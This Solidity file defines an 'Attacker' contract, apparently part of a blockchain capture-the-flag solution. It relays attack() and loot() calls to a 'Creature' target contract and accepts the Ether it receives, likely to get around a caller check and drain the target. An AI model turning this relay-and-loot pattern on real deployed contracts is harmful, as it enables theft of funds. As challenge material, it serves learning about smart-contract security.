// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ICreature {
    function attack(uint256 _damage) external;

    function loot() external;
}

contract Attacker {
    ICreature public target;

    constructor(address _target) {
        target = ICreature(_target);
    }

    function attackCreature(uint256 _damage) public {
        target.attack(_damage);
    }

    function lootCreature() public {
        target.loot();
    }

    receive() external payable {}
}
